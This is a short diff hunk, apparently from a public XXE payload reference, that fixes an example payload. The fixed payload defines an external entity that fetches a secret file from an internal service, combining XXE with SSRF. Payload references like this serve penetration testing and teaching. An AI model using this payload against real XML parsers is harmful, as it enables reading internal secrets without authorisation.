@@ -155,7 +155,7 @@ XXE can be combined with the [SSRF vulnerability](https://github.com/swisskyrepo
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
-<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
+<!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
 ]>
 <foo>&xxe;</foo>
 ```
